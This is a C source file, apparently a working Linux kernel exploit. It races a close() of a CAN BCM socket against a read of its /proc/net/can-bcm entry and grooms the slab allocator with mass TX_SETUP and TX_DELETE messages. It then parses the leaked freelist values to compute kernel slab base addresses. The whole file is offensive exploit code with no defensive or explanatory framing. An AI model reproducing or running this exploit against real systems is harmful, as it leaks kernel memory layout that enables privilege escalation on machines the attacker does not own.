#define _GNU_SOURCE        /* See feature_test_macros(7) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/can/bcm.h>
#include <sys/syscall.h>

/* Runtime configuration */

#define NR_SLABS 150
#define CACHE_OBJECTS 16
#define OBJECT_SIZE 512
#define BCM_BUFFER_LENGTH 2046
#define RX_ALLOC 0
#define TX_ALLOC CACHE_OBJECTS
#define CPU_TARGET 2
#define CPU_READ CPU_TARGET
#define CPU_SPARE 3

/* Definitions */

#define MAX_BCM_ID 1000
#define BCM_ID_LENGTH 20
#define DIRENT_SIZE 1024
#define FILE_BUFFER_MAX 256
#define READ_THREADS 1
#define MARKER_PARSER "t2="
#define IFINDEX 3
#define NSEC_PER_USEC   1000L
#define IVAL1_USEC 1000
#define IVAL2_USEC 1000

#define READ_BARRIERS (READ_THREADS + 2)		// READ_THREADS + MAIN + close()
#define THREAD_BARRIERS 1
pthread_barrier_t barrier[THREAD_BARRIERS];

char files_found[MAX_BCM_ID][BCM_ID_LENGTH] = {{0}};
int can_sk;
int fd;

struct slab_counts{
	unsigned long address;
	unsigned int count;
};

struct msg{
	struct bcm_msg_head msg_head;
	struct can_frame frame[1];
};

struct linux_dirent{
	unsigned long  d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};

unsigned int get_max_cpu_index(void){
        unsigned int max_cpu_index;

        if(CPU_TARGET > CPU_READ){

                max_cpu_index = CPU_TARGET;

        }else{

                max_cpu_index = CPU_READ;

        }

        if(max_cpu_index < CPU_SPARE){

                max_cpu_index = CPU_SPARE;
        }

return max_cpu_index;
}

int get_cpu(void){
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);

	if(sched_getaffinity(0, sizeof(cpuset), &cpuset) < 0){

		return -1;

	}

	return CPU_COUNT(&cpuset);
}

int set_cpu(unsigned int cpu){
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	if(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0){

		return -1;

	}

return 0;
}

int create_can_bcm_socket(void){
	int fd;

	if((fd = socket(AF_CAN, SOCK_DGRAM, CAN_BCM)) < 0){

		return -1;

	}

	return fd;
}

char *register_bcm_entries(int detect){
        struct linux_dirent *dirent = NULL;
        char *file = NULL;
        char dirent_s[DIRENT_SIZE];
        char d_type;
        int fd;
        int fd_can_bcm;
        unsigned int j = 0; 
        unsigned int l = 0; 
        int i = 0; 
        int ret = 0; 

        memset(&dirent_s, '\0', sizeof(dirent_s));

        fd = open("/proc/net/can-bcm/", O_RDONLY | O_DIRECTORY);
        if(fd < 0){

                fd_can_bcm = create_can_bcm_socket();
                if(fd_can_bcm < 0){

                        return NULL;

                }

                close(fd_can_bcm);

                fd = open("/proc/net/can-bcm/", O_RDONLY | O_DIRECTORY);
                if(fd < 0){

                        return NULL;

                }    
        }    

        for(;;){

                if((ret = syscall(SYS_getdents, fd, &dirent_s, sizeof(dirent_s))) < 0){  

                        close(fd);

                        return (void *)-1;

                }

                if(ret == 0){

                        close(fd);

                        return NULL;

                }

                for(i = 0; i < ret;){

                        dirent = (struct linux_dirent *) (dirent_s + i);

                        d_type = *(dirent_s + i + dirent->d_reclen - 1);
    
                        if(d_type == DT_REG){

                                if(j >= MAX_BCM_ID){

					close(fd);

					return (void *)-1;

                                }

                                if(strlen(dirent->d_name) > BCM_ID_LENGTH){

					close(fd);

					return (void *)-1;

                                }

                                if(detect == 1){
                                        for(l = 0; l < MAX_BCM_ID; l++){

                                                if(strcmp(files_found[l], dirent->d_name) == 0){

                                                        goto out;

                                                }

                                        }

                                        file = strdup(dirent->d_name);
                                        close(fd);

                                        return file;
                                }else{
                                        memcpy(&files_found[j], dirent->d_name, strlen(dirent->d_name));
                                        j++;
                                }
                        }

                        out:

                        i += dirent->d_reclen;
                }
        }
}

int parse_content(char *content, int length){
	struct slab_counts slab_counts[CACHE_OBJECTS - 1];
	long leaked_freelist_decoded[CACHE_OBJECTS] = {0};
	long leaked_freelist[CACHE_OBJECTS] = {0};
	long slab[CACHE_OBJECTS] = {0};
	long slab_base_address, result_op;
	char *line;
	char *line_end;
	int first_entry_sign_positive;
	int number_addresses_obtained;
	int found;
	int i, l;

	memset(&slab_counts, '\0',sizeof(slab_counts));

	if(length <= 0){

		return -1;

	}

	#ifdef DEBUG
		printf("[*] - Content: \n\n%s", content);
	#endif

	i = 0;

	while((line = strstr(content, MARKER_PARSER)) != NULL){

		line += strlen(MARKER_PARSER);
		line_end = strchr(line,'#');
		*line_end = '\0';

		content = line_end + 1;

		leaked_freelist[i] = atol(line);
		i++;
	}

	if(i != CACHE_OBJECTS){

		#ifdef VERBOSE
			printf("[!] - Not enough objects obtained\n");
		#endif

		return -1;
	}

	for(i = 0; i < CACHE_OBJECTS; i++){

		if(leaked_freelist[i] == 0){

			return -1;

		}

	}

	#ifdef VERBOSE
		printf("[*] - %d objects obtained\n", i);
		printf("[*] - Validating the first entry\n");
	#endif

	if(leaked_freelist[0] > 0){

		first_entry_sign_positive = 1;

	}else{

		first_entry_sign_positive = 0;

	}

	#ifdef VERBOSE
		printf("[*] - First entry validated\n");
		printf("[*] - Validating the other %d objects\n", (CACHE_OBJECTS - 1));
	#endif

	for(i = 1; i < CACHE_OBJECTS; i++){

		if((leaked_freelist[i] > 0) && first_entry_sign_positive){

			return -1;

		} else if((leaked_freelist[i] < 0) && !first_entry_sign_positive){

			return -1;

		}

	}

	#ifdef VERBOSE
		printf("[*] - All objects validated\n");

		#ifdef DEBUG
			printf("\n");
		#endif
	#endif

	for(i = 0; i < CACHE_OBJECTS; i++){

		leaked_freelist_decoded[i] = leaked_freelist[i] * NSEC_PER_USEC;

	}

	#ifdef DEBUG
		for(i = 0; i < CACHE_OBJECTS; i++){

			if(leaked_freelist[i]){

				printf("Leaked freelist %d: 0x%lx\t| Leaked freelist decoded: 0x%lx\n", i, leaked_freelist[i], leaked_freelist_decoded[i]);

			}

		}

		printf("\n");
	#endif

	#ifndef DEBUG
		printf("\n");
	#endif

	printf("Leaked freelist encoded null pointer: 0x%lx\n", leaked_freelist_decoded[0]);

	printf("\n");

	for(i = 1; i < CACHE_OBJECTS; i ++){

		result_op = (leaked_freelist_decoded[0]) ^ (leaked_freelist_decoded[i]);

		#ifdef DEBUG
			printf("Leaked slab address: 0x%lx\n", result_op);
		#endif

		slab[i - 1] = result_op;
		slab[i - 1] |= 0xffff000000000000;
		slab[i - 1] &= 0xfffffffffffff000;
	}
	
	#ifdef DEBUG
		printf("\n");

		for(i = 0; i < (CACHE_OBJECTS - 1); i++){

			printf("Leaked slab: 0x%lx\n", slab[i]);

		}

		printf("\n");
	#endif

	number_addresses_obtained = 0;

	for(i = 0; i < (CACHE_OBJECTS - 1); i++){

		found = 0;

		for(l = 0; l < (CACHE_OBJECTS - 1); l++){

			if(slab_counts[l].address == slab[i]){

				slab_counts[l].count++;
				found = 1;

			}

		}

		if(found == 0){	
			for(l = 0; l < (CACHE_OBJECTS - 1); l++){

				if(slab_counts[l].address == 0){

					slab_counts[l].address = slab[i];
					slab_counts[l].count++;
					number_addresses_obtained++;

					break;
				}
			}
		}
	}

	#ifdef DEBUG
		for(i = 0; i < (CACHE_OBJECTS - 1); i++){
			printf("slab_counts[%d].address: 0x%lx | count: %d\n",i,slab_counts[i].address,slab_counts[i].count);
		}
	#endif

	printf("\n");

	slab_base_address = 0xffffffffffffffff;

	if(number_addresses_obtained <= 2){

		for(i = 0; i < number_addresses_obtained; i++){

			if(slab_counts[i].address < slab_base_address){

				slab_base_address = slab_counts[i].address;

			}

		}
	}else{		
		for(i = 0; i < number_addresses_obtained; i++){

			if((slab_counts[i].address < slab_base_address) && slab_counts[i].count > 1){

				slab_base_address = slab_counts[i].address;

			}

		}

	}

	for(i = 0; i < CACHE_OBJECTS; i++){

		printf("slab[%d] =\t0x%lx\n", i, slab_base_address + (OBJECT_SIZE * i));

	}

	printf("\n");

return 0;
}

/* Close thread */

void *race01(void *argument){
	long error;

	#ifdef VERBOSE2
		printf("[*] - Setting up CPU affinity race01 (close) thread to CPU %d\n", CPU_TARGET);
	#endif

	if(set_cpu(CPU_TARGET) < 0){
		return (void *)-1;
	}

	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE2
		printf("[*] - Closing socket (race01)\n");
	#endif

	error = close(can_sk);

return (void *)error;
}

/* Read thread */

void *race02(void *argument){
	char bcm_buffer[BCM_BUFFER_LENGTH];
	int length = 0;
	long error;

	memset(&bcm_buffer,'\0',sizeof(bcm_buffer));

	#ifdef VERBOSE2
		printf("[*] - Setting up CPU affinity race02 (read) thread to CPU %d\n", CPU_READ);
	#endif

	if(set_cpu(CPU_READ) < 0){
		return (void *)-1;
	}
	
	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE2
		printf("[*] - Reading /proc/net/can-bcm/entry (race02)\n");
	#endif

	length = read(fd, &bcm_buffer, sizeof(bcm_buffer) - 1);
	if(length < 0){

		#ifdef VERBOSE2
			printf("[!] - Error while reading /proc/net/can-bcm/entry\n");			
		#endif

		return (void *)-1;
	}

	if(parse_content(bcm_buffer, length)) {

		#ifdef VERBOSE2
			printf("[!] - Error while parsing the content\n");
		#endif
	}

	error = EXIT_SUCCESS;

return (void *)error;
}

int initialize_barriers(void){

	if(pthread_barrier_init(&barrier[0], 0, READ_BARRIERS) < 0){

		return -1;

	}

return 0;       
}  

int main(void){
	pthread_t read_threads[READ_THREADS];
	pthread_t close_thread;
	struct sockaddr_can sockaddr_can;
	struct msghdr msghdr;
	struct iovec iovec;
	struct msg msg;
	char file_buffer[FILE_BUFFER_MAX];
	char *can_bcm_entry;
	unsigned int max_cpu_index;
	int retval;
	int ncpus;
	int error = -EXIT_FAILURE;
	int i, j, l;

	#ifdef VERBOSE
		printf("[*] - Disabling stdout buffering\n");
	#endif  

	setbuf(stdout, NULL);

	/* Initialize structures */

	memset(&sockaddr_can, '\0', sizeof(sockaddr_can));
	memset(&msghdr, '\0', sizeof(msghdr));
	memset(&iovec, '\0', sizeof(iovec));
	memset(&msg, '\0', sizeof(msg));

	/* Initialize char buffer */

	memset(&file_buffer, '\0', sizeof(file_buffer));

	#ifdef VERBOSE
		printf("[*] - Checking number of CPUs available\n");
	#endif

        ncpus = get_cpu();
        max_cpu_index = get_max_cpu_index();
        if(ncpus < (max_cpu_index + 1)){

		#ifdef VERBOSE
			printf("[!] - Number of CPUs available below required\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - CPUs available: %d\n", ncpus);
	#endif

	if(initialize_barriers() < 0){

		#ifdef VERBOSE
			printf("[!] - Error initializing barriers\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity spare thread CPU %d\n", CPU_SPARE);
	#endif

	if(set_cpu(CPU_SPARE) < 0){
	
		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		exit(error);
	}

	can_sk = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);
	if(can_sk < 0 ){

		#ifdef VERBOSE
			printf("[!] - Error while creating CAN BCM socket\n");
		#endif

		exit(error);
	}

	#ifdef VERBOSE
		printf("[*] - Socket created successfully\n");
	#endif

	sockaddr_can.can_ifindex = IFINDEX;
	
	if(connect(can_sk, (struct sockaddr *)&sockaddr_can, sizeof(sockaddr_can)) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while connecting to the CAN BCM socket\n");
		#endif

		goto error_exit_1;
	}

	#ifdef VERBOSE
		printf("[*] - Socket connected successfully\n");
	#endif

	can_bcm_entry = register_bcm_entries(1);
	if(can_bcm_entry == NULL){

		#ifdef VERBOSE
			printf("[!] - Error: Unable to detect our CAN BCM entry\n");
		#endif
		
		goto error_exit_1;
	}

	#ifdef VERBOSE
		printf("[*] - CAN BCM entry: %s\n", can_bcm_entry);
	#endif

	snprintf(file_buffer, sizeof(file_buffer) - 1, "/proc/net/can-bcm/%s", can_bcm_entry);

	free(can_bcm_entry);
	can_bcm_entry = NULL;

	fd = open(file_buffer, O_RDONLY);
	if(fd < 0){

		#ifdef VERBOSE
			printf("[!] - Error while opening /proc/net/can-bcm/%s\n", can_bcm_entry);
		#endif

		goto error_exit_1;
	}

	msghdr.msg_name = NULL;
	msghdr.msg_namelen = 0;
	msghdr.msg_iov = &iovec;
	msghdr.msg_iovlen = 1;
	msghdr.msg_control = NULL;
	msghdr.msg_controllen = 0;

	iovec.iov_base = &msg;
	iovec.iov_len = sizeof(msg);

	msg.msg_head.flags = 0;
	msg.msg_head.nframes = 1;
	msg.msg_head.count = 0;
	msg.msg_head.ival1.tv_sec = 1;
	msg.msg_head.ival1.tv_usec = IVAL1_USEC;
	msg.msg_head.ival2.tv_sec = 1;
	msg.msg_head.ival2.tv_usec = IVAL2_USEC;

	for(i = 0; i < RX_ALLOC; i++){

		msg.msg_head.opcode  = RX_SETUP;
		msg.msg_head.can_id  = i;

		if(sendmsg(can_sk, &msghdr, 0) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending the messages\n");
			#endif

			goto error_exit_2;
		}

	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity main thread CPU %d\n", CPU_TARGET);
	#endif

	if(set_cpu(CPU_TARGET) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		goto error_exit_2;
	}

	l = 0;

	#ifdef VERBOSE
		printf("[*] - Preparing the cache\n");
		printf("[*] - Allocating %d objects\n", NR_SLABS * CACHE_OBJECTS);
	#endif

	for(i = 0; i < NR_SLABS; i++){
		for(j = 0; j < CACHE_OBJECTS; j++){

			msg.msg_head.opcode = TX_SETUP;
			msg.msg_head.can_id = l++;

			if(sendmsg(can_sk, &msghdr, 0) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while sending the messages\n");
				#endif

				goto error_exit_2;
			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - Freeing %d objects\n", CACHE_OBJECTS);
	#endif

	for(i = 0; i < CACHE_OBJECTS; i++){

		msg.msg_head.opcode = TX_DELETE;
		msg.msg_head.can_id = --l;

		if(sendmsg(can_sk, &msghdr, 0) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending the messages\n");
			#endif

			goto error_exit_2;
		}

	}

	#ifdef VERBOSE
		printf("[*] - Allocating target object\n");
	#endif

	for(i = 0; i < TX_ALLOC; i++){

		msg.msg_head.opcode = TX_SETUP;
		msg.msg_head.can_id = l++;

		if(sendmsg(can_sk, &msghdr, 0) < 0){

			#ifdef VERBOSE
				printf("[!] - Error while sending the messages\n");
			#endif

			goto error_exit_2;
		}

	}

	#ifdef VERBOSE
		printf("[*] - Setting up CPU affinity spare thread CPU %d\n", CPU_SPARE);
	#endif

	if(set_cpu(CPU_SPARE) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while setting CPU affinity\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Freeing remaining objects\n");
	#endif

	l = 0;

	for(i = 0; i < (NR_SLABS - 1); i++){
		for(j = 0; j < CACHE_OBJECTS; j++){

			msg.msg_head.opcode = TX_DELETE;
			msg.msg_head.can_id = l++;
	
			if(sendmsg(can_sk, &msghdr, 0) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while sending the messages\n");
				#endif

				goto error_exit_2;
			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - Creating close thread\n");
	#endif

	if(pthread_create(&close_thread, NULL, &race01, NULL) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while creating close thread\n");
		#endif

		goto error_exit_2;
	}

	#ifdef VERBOSE
		printf("[*] - Creating read threads\n");
	#endif

	if(READ_THREADS > 0){
		for(i = 0; i < READ_THREADS; i++){
			if(pthread_create(&read_threads[i], NULL, &race02, NULL) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while creating read threads\n");
				#endif

				goto error_exit_2;
			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - The race starts, releasing race barriers\n");
	#endif

	/* After here, the socket can't be closed as we do not know if the thread closed it already */
	pthread_barrier_wait(&barrier[0]);

	#ifdef VERBOSE
		printf("[*] - Waiting...\n");
		printf("[*] - Finishing read threads\n");
	#endif

	if(READ_THREADS > 0){
		for(i = 0; i < READ_THREADS; i++){
			if(pthread_join(read_threads[i], (void *)&retval) < 0){

				#ifdef VERBOSE
					printf("[!] - Error while waiting for the read threads\n");
				#endif

			}else{
				if(retval != 0){

					#ifdef VERBOSE
						printf("[!] - Read thread %d returned error %d\n", i, retval);
					#endif

				}

			}

		}

	}

	#ifdef VERBOSE
		printf("[*] - Finishing close thread\n");
	#endif

	if(pthread_join(close_thread, (void *)&retval) < 0){

		#ifdef VERBOSE
			printf("[!] - Error while waiting for the close thread\n");
		#endif

	}else{
		if(retval != 0){

			#ifdef VERBOSE
				printf("[!] - Close thread returned error %d\n", retval);
			#endif

		}
	}

	#ifdef VERBOSE
		printf("[*] - Exiting...\n");
	#endif

	error = EXIT_SUCCESS;

	error_exit_2:

		close(fd);

	error_exit_1:

		if(retval != 0){
			close(can_sk);
		}

return error;
}
